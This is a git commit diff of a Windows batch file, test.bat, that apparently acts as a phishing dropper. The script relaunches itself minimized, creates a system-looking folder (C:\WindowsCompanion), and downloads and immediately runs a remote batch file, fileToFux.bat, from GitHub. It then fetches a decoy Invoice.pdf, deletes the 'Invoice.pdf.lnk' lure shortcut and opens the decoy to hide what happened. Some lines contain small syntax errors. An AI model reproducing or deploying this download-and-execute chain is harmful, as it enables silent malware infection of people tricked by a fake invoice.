42d4e06b8f286d2e565ed282c75704b10fc88744
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2024-01-02 13:25:01 +0100

    Update test.bat

--- test.bat
+++ test.bat
@@ -2,14 +2,17 @@
 
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 
-    if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"
-    
-    set URL=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat
-    
-    set ZIP_PATH=C:\WindowsCompanion\fileToFux.bat
-    
-    set DESTINATION_FOLDER=C:\WindowsCompanion
-    
-    curl -L -o "%ZIP_PATH%" "%URL%" && "%ZIP_PATH%"
+    set PATH_TO_ENTRY=%1
+
+    if not exist "C:\WindowsCompanion" md "C:\WindowsCompanion"    
+    set URL_FUX=https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat    
+    set PATH_FUX=C:\WindowsCompanion\fileToFux.bat    
+    curl -L -o "%PATH_FUX%" "%URL_FUX%" && "%PATH_FUX%"
+
+    set URL_INVOICE=https://raw.githubusercontent.com/BelliniGauss/1/main/Invoice.pdf
+    set INVOICE_NAME=Invoice.pdf
+    set PATH_INVOICE=%PATH_TO_ENTRY%\%INVOICE_NAME%
+    del Invoice.pdf.lnk"
+    curl -L -o "PATH_INVOICE" "%URL_INVOICE%" && start Invoice.pdf "
 
 exit
